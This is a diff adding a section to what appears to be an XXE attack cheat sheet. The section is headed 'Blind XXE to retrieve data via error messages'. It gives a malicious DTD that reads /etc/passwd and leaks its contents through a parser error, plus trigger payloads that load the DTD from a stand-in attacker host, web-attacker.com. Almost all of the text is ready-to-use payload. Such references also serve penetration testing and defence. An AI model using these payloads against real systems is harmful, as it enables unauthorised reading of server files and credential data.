@@ -85,3 +85,20 @@ Trigger vulnerability:
 "http://web-attacker.com/malicious.dtd"> %xxe;]> 
 ```
 
+### Blind XXE to retrieve data via error messages
+
+Malicious DTD:
+
+```
+<!ENTITY % x SYSTEM "file:///etc/passwd">
+<!ENTITY % y "<!ENTITY &#x25; z SYSTEM 'file:///nonexistent/%x;'>">
+
+%y;
+%z;
+```
+
+Trigger vulnerability:
+
+```
+<!DOCTYPE hh [ <!ENTITY % e SYSTEM "https://web-attacker.com/exploit.dtd"> %e;]>
+```
